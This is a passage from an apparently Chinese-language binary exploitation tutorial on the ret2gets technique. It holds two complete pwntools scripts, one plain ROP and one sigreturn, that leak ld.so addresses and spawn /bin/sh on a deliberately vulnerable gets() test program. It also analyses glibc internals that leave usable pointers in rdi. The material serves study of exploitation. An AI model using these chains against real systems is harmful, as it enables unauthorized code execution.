    target.sendlineafter(b"ROP me if you can!", payload)

    payload = flat(
        p32(0x0),  # lock
        b"A" * 0x4,  # cnt
    )
    target.sendline(payload)
    target.sendline(b"BBBB")

    target.recvline()
    tls = u64(target.recvline().strip()[8:].ljust(0x8, b"\x00"))
    ld = tls + 0xC8C0
    target.success(f"tls: {hex(tls)}")
    target.success(f"ld: {hex(ld)}")

    gets = 0x40114D
    payload = flat(
        b"A" * 0x20,
        elf.bss() + 0xF00,
        gets,
    )
    target.sendlineafter(b"ROP me if you can!", payload)

    payload = flat(
        b"A" * 0x20,
        b"/bin/sh\x00",
        ld + rop.find_gadget(["pop rdi", "pop rbp", "ret"])[0],
        elf.bss() + 0xF00,
        0x0,
        ld + rop.find_gadget(["pop rsi", "pop rbp", "ret"])[0],
        0x0,
        0x404F60,
        ld + rop.find_gadget(["pop rdx", "leave", "ret"])[0],
        0x0,
        ld + rop.find_gadget(["pop rax", "ret"])[0],
        0x3B,
        ld + rop.find_gadget(["syscall", "ret"])[0],
    )
    target.sendline(payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

### Using sigreturn

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    ROP,
    SigreturnFrame,
    args,
    context,
    flat,
    p32,
    process,
    raw_input,
    remote,
    u64,
)


FILE = "./vuln_patched"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
ld = ELF("./ld-linux-x86-64.so.2")
rop = ROP(ld)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload = flat(
        b"A" * 0x28,
        elf.plt["gets"],
        elf.plt["gets"],
        elf.plt["puts"],
        elf.sym["main"],
    )
    raw_input("DEBUG")
    target.sendlineafter(b"ROP me if you can!", payload)

    payload = flat(
        p32(0x0),  # lock
        b"A" * 0x4,  # cnt
    )
    target.sendline(payload)
    target.sendline(b"BBBB")

    target.recvline()
    tls = u64(target.recvline().strip()[8:].ljust(0x8, b"\x00"))
    ld = tls + 0xC8C0
    target.success(f"tls: {hex(tls)}")
    target.success(f"ld: {hex(ld)}")

    gets = 0x40114D
    payload = flat(
        b"A" * 0x20,
        elf.bss(),
        gets,
    )
    target.sendlineafter(b"ROP me if you can!", payload)

    frame = SigreturnFrame()
    frame.rax = 0x3B
    frame.rdi = elf.bss()
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = ld + rop.find_gadget(["syscall", "ret"])[0]

    payload = flat(
        b"A" * 0x20,
        b"/bin/sh\x00",
        ld + rop.find_gadget(["pop rax", "ret"])[0],
        0xF,
        ld + rop.find_gadget(["syscall", "ret"])[0],
        bytes(frame),
    )
    target.sendline(payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

## Digging Deeper

### RDI != \_IO_stdfile_0_lock

```c
// gcc -Wall vuln.c -o vuln -no-pie -fno-stack-protector -std=c99

#include <stdio.h>

int main() {
  char buf[0x20];
  puts("ROP me if you can!");
  gets(buf);
  puts("No lock for you ;)");

  return 0;
}
```

#### Case 1: RDI is Writable

上面这个程序执行 `puts` 后 rdi 就不会是 `_IO_stdfile_0_lock` 了，取而代之的是 `_IO_stdfile_1_lock`，但是很好解决啊，我们输入大小又没限制，直接先返回到一次 `gets` 重新令 rdi 等于 `_IO_stdfile_0_lock` 就好了。

:::warning
唯一需要注意的是，返回到 `gets` 的话，rdi 必须是可写内存地址，否则会出错。
:::

#### Case 2: RDI is Readonly

如果 rdi 是只读地址，我们就不能直接使用 `gets` 了。但是我们可以先使用 `puts`，这将返回给 rdi `_IO_stdfile_1_lock`，然后就可以使用和上面类似的方法继续构造 ROP Chain 。

#### Case 3: RDI == NULL

此时大多数 IO 函数都不可用了，不过还是存在例外。

##### printf / scanf

[printf](https://elixir.bootlin.com/glibc/glibc-2.41/source/stdio-common/printf.c) 的定义如下：

```c
int
__printf (const char *format, ...)
{
  va_list arg;
  int done;

  va_start (arg, format);
  done = __vfprintf_internal (stdout, format, arg, 0);
  va_end (arg);

  return done;
}

#undef _IO_printf
ldbl_strong_alias (__printf, printf);
ldbl_strong_alias (__printf, _IO_printf);
```

`va_list` 用于声明一个保存当前可变参数列表的指针；`va_start (arg, format)` 用于告诉编译器可变参数从 `format` 之后开始，它的第二个参数必须是函数参数表里，最后一个已知的固定参数，比如 `printf` 中就是 `format`；`va_end` 会做一些清理工作，结束访问。

注意到传入 `__vfprintf_internal (stdout, format, arg, 0)` 的 rdi 为 `stdout`。

```c collapse={12-49}
/* The FILE-based function.  */
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)
{
  /* Orient the stream.  */
#ifdef ORIENT
  ORIENT;
#endif

  /* Sanity check of arguments.  */
  ARGCHECK (s, format);

#ifdef ORIENT
  /* Check for correct orientation.  */
  if (_IO_vtable_offset (s) == 0
      && _IO_fwide (s, sizeof (CHAR_T) == 1 ? -1 : 1)
      != (sizeof (CHAR_T) == 1 ? -1 : 1))
    /* The stream is already oriented otherwise.  */
    return EOF;
#endif

  if (!_IO_need_lock (s))
    {
      struct Xprintf (buffer_to_file) wrap;
      Xprintf (buffer_to_file_init) (&wrap, s);
      Xprintf_buffer (&wrap.base, format, ap, mode_flags);
      return Xprintf (buffer_to_file_done) (&wrap);
    }

  int done;

  /* Lock stream.  */
  _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);
  _IO_flockfile (s);

  /* Set up the wrapping buffer.  */
  struct Xprintf (buffer_to_file) wrap;
  Xprintf (buffer_to_file_init) (&wrap, s);

  /* Perform the printing operation on the buffer.  */
  Xprintf_buffer (&wrap.base, format, ap, mode_flags);
  done = Xprintf (buffer_to_file_done) (&wrap);

  /* Unlock the stream.  */
  _IO_funlockfile (s);
  _IO_cleanup_region_end (0);

  return done;
}
```

我们跟进到 `ARGCHECK` 后发现，如果 `Format == NULL` 它就会让 `printf` 提前返回，那我们调用 `__vfprintf_internal` 时传入的 rdi 会不会继续残留在原地呢？

```c {12-16}
#define ARGCHECK(S, Format) \
  do                                                     \
    {                                                    \
      /* Check file argument for consistence.  */        \
      CHECK_FILE (S, -1);                                \
      if (S->_flags & _IO_NO_WRITES)                     \
       {                                                 \
  S->_flags |= _IO_ERR_SEEN;                             \
  __set_errno (EBADF);                                   \
  return -1;                                             \
       }                                                 \
      if (Format == NULL)                                \
       {                                                 \
  __set_errno (EINVAL);                                  \
  return -1;                                             \
       }                                                 \
    } while (0)
```

```c
// gcc -Wall vuln.c -o vuln -no-pie -fno-stack-protector -std=c99

#include <stdio.h>

int main() {
  printf(NULL);

  return 0;
}
```

没毛病，rdi 的值还残留着 `_IO_2_1_stdout_`，成功令它变成可写地址，那现在就可以像上面一样使用 `gets` 了。

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.3nrzsf095k.avif" alt="" />
</center>

据说这里能用 FSOP 进行 leak，不过我还没学过，暂时先把参考链接放上来，以后有时间了再研究研究：

- <https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html#leak-libc>
- <https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html>
- <https://vigneshsrao.github.io/posts/babytcache/>

另外，由于 `scanf` 和 `printf` 类似，就不贴代码了，可以试试 `scanf(NULL)`，rdi 应该会保留 `_IO_2_1_stdin_`。

##### fflush

还有一个比较常见的接收 `FILE` 作为第一个参数的函数就是 [fflush](https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/iofflush.c#L31) ，当 rdi 是 NULL 时，它会调用 `_IO_flush_all` 刷新所有 IO：

```c {2-3}
int _IO_fflush(FILE *fp) {
  if (fp == NULL)
    return _IO_flush_all();
  else {
    int result;
    CHECK_FILE(fp, EOF);
    _IO_acquire_lock(fp);
    result = _IO_SYNC(fp) ? EOF : 0;
    _IO_release_lock(fp);
    return result;
  }
}
libc_hidden_def(_IO_fflush)

weak_alias (_IO_fflush, fflush)
libc_hidden_weak (fflush)

#ifndef _IO_MTSAFE_IO
strong_alias (_IO_fflush, __fflush_unlocked)
libc_hidden_def (__fflush_unlocked)
weak_alias (_IO_fflush, fflush_unlocked)
libc_hidden_weak (fflush_unlocked)
#endif
```

```c {20, 24-27}
int _IO_flush_all(void) {
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg(flush_cleanup);
  _IO_lock_lock(list_all_lock);
#endif

  for (fp = (FILE *)_IO_list_all; fp != NULL; fp = fp->_chain) {
    run_fp = fp;
    _IO_flockfile(fp);

    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) ||
         (_IO_vtable_offset(fp) == 0 && fp->_mode > 0 &&
          (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))) &&
        _IO_OVERFLOW(fp, EOF) == EOF)
      result = EOF;

    _IO_funlockfile(fp);
    run_fp = NULL;
  }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock(list_all_lock);
  _IO_cleanup_region_end(0);
#endif

  return result;
}
libc_hidden_def(_IO_flush_all)
```

`_IO_MTSAFE_IO` 中的 `MTSAFE` 是 `Multi Thread Safe` 的意思，即多线程时 `_IO_flush_all` 最后执行的将是 `_IO_cleanup_region_end (0)`。

单线程时最后执行的是 `_IO_funlockfile (fp)`，这和我们之前看到的一样，rdi 肯定会残留锁。

我们主要关注 `_IO_cleanup_region_end (0)` 执行完 rdi 残留的是什么内容：

```c
#define _IO_cleanup_region_end(_doit) \
  __libc_cleanup_region_end (_doit)

/* End critical region with cleanup.  */
#define __libc_cleanup_region_end(DOIT)  \
  if (_cleanup_start_doit)                    \
    __libc_cleanup_pop_restore (&_buffer);    \
  if (DOIT)                                   \
    _cleanup_routine (_buffer.__arg);         \
  } /* matches __libc_cleanup_region_start */
```

[\_\_libc_cleanup_pop_restore](https://elixir.bootlin.com/glibc/glibc-2.41/source/nptl/libc-cleanup.c#L53) 接受 `_buffer` 地址作为参数，这是一个位于可写区域的地址，因此我们又成功得到了可写的 rdi，可以继续通过上面的 gets 完成接下来的 ROP 了。`_cleanup_routine` 也是同理。

#### Case 4: RDI is Junk

##### rand

`rand` 虽然不是 IO 函数，但它会在 rdi 内残留一个指向 `unsafe_state` 结构体的指针，适用于各种版本的 libc 。

```c
long int __random(void) {
  int32_t retval;
  __libc_lock_lock(lock);
  (void)__random_r(&unsafe_state, &retval);
  __libc_lock_unlock(lock);

  return retval;
}

weak_alias(__random, random)
```

##### getchar

理论上，`getchar` 是完美的。因为参数无关紧要，而且由于 IO 函数通常在最后才会解锁，所以它们会在 rdi 中残留一个锁（`getchar` 会返回 `_IO_stdfile_0_lock_`）。可惜的是，这里存在一个优化：`_IO_need_lock` 。

```c
int getchar(void) {
  int result;
  if (!_IO_need_lock(stdin))
    return _IO_getc_unlocked(stdin);
  _IO_acquire_lock(stdin);
  result = _IO_getc_unlocked(stdin);
  _IO_release_lock(stdin);
  return result;
}

#ifndef _IO_MTSAFE_IO
#undef getchar_unlocked
weak_alias(getchar, getchar_unlocked)
#endif
```

如果 `((_fp)->_flags2 & _IO_FLAGS2_NEED_LOCK) != 0`，则说明需要加锁。

```c
#define _IO_need_lock(_fp) \
  (((_fp)->_flags2 & _IO_FLAGS2_NEED_LOCK) != 0)
```

否则会进入 if，执行 `_IO_getc_unlocked`，发现执行的过程中还会调用别的函数，最后执行完并没有在 rdi 中残留什么有用的东西。

此外，根据引用我们推测，下面这些函数可能也存在同样的问题，不过还是需要自己去看代码才能确定。

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.5treegc8sj.avif" alt="" />
</center>

下面是多线程版本，`getchar` 最终结束后 rdi 中会残留 `_IO_stdfile_0_lock`。

```c
// gcc -Wall vuln.c -o vuln -no-pie -fno-stack-protector

#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>

void *thread_function(void *arg);

int main() {
  pthread_t tids[2];
  int ret;

  ret = pthread_create(&tids[0], NULL, thread_function, (void *)1);
  if (ret != 0) {
    perror("pthread_create 1 failed");
    exit(EXIT_FAILURE);
  }

  ret = pthread_create(&tids[1], NULL, thread_function, (void *)2);
  if (ret != 0) {
    perror("pthread_create 2 failed");
    exit(EXIT_FAILURE);
  }

  pthread_join(tids[0], NULL);
  pthread_join(tids[1], NULL);

  return 0;
}

void *thread_function(void *arg) {
  getchar();

  pthread_exit(NULL);
}
```

当创建线程时，会调用 [\_IO_enable_locks](https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/genops.c#L553)，以确保所有新旧 IO 都设置了 `_IO_FLAGS2_NEED_LOCK`：

```c
/* In a single-threaded process most stdio locks can be omitted.  After
   _IO_enable_locks is called, locks are not optimized away any more.
   It must be first called while the process is still single-threaded.

   This lock optimization can be disabled on a per-file basis by setting
   _IO_FLAGS2_NEED_LOCK, because a file can have user-defined callbacks
   or can be locked with flockfile and then a thread may be created
   between a lock and unlock, so omitting the lock is not valid.

   Here we have to make sure that the flag is set on all existing files
   and files created later.  */
void _IO_enable_locks(void) {
  _IO_ITER i;

  if (stdio_needs_locking)
    return;
  stdio_needs_locking = 1;
  for (i = _IO_iter_begin(); i != _IO_iter_end(); i = _IO_iter_next(i))
    _IO_iter_file(i)->_flags2 |= _IO_FLAGS2_NEED_LOCK;
}
libc_hidden_def(_IO_enable_locks)
```

有个想法是手动篡改 `_IO_FLAGS2_NEED_LOCK` 的值，不知道行不行，反正我还没遇到过，后面自己研究研究吧。

##### putchar

```c
int putchar(int c) {
  int result;
  _IO_acquire_lock(stdout);
  result = _IO_putc_unlocked(c, stdout);
  _IO_release_lock(stdout);
  return result;
}

#if defined weak_alias && !defined _IO_MTSAFE_IO
#undef putchar_unlocked
weak_alias(putchar, putchar_unlocked)
#endif
```

这个函数就不管是不是多线程都会有残留了，不过也有限制，它要求 rdi 中必须是一个 char，或者 int 。不过感觉大多数情况下应该都不会有问题？不管了，等哪天有幸遇到再说对不对。

## References

[ret2gets](https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets)
